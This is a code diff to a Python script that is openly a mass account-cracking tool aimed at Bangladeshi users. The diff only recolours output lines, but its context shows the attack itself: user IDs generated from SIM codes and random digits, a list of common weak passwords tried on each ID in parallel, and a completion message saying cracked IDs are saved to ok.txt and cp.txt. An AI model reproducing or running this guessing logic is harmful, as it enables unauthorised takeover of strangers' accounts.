@@ -216,7 +216,7 @@ def BRA():
 		tl = str(len(user))
 		
 		print('\033[32;1m┏━[\033[34;1m•\033[32;5m] COUNTRY       ► Bangladesh')
-		print('\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE      ► {kode} ')
+		print('\033[32;1m┣━[\033[34;1m•\033[32;5m] SIM CODE      ►\033[1;93m {kode} ')
 		print(f'\033[32;1m┣━[\033[34;1m•\033[32;5m] TOTAL ACCOUNT ► '+tl)
 		print('\033[32;1m┗━[\033[34;1m•\033[32;5m] IF NO RESULTS \033[1;93m(ON/OFF) \033[32;5mAIRPLANE MODES')
 		print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -224,7 +224,7 @@ def BRA():
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
 			yaari.submit(b,uid,pwx,tl)
-	print(50*'_')
+	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 	print(' [💉] Crack process has been completed')
 	print(' [💉] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
@@ -290,3 +290,4 @@ def b(uid,pwx,tl):
         pass
 Main()
 
+	
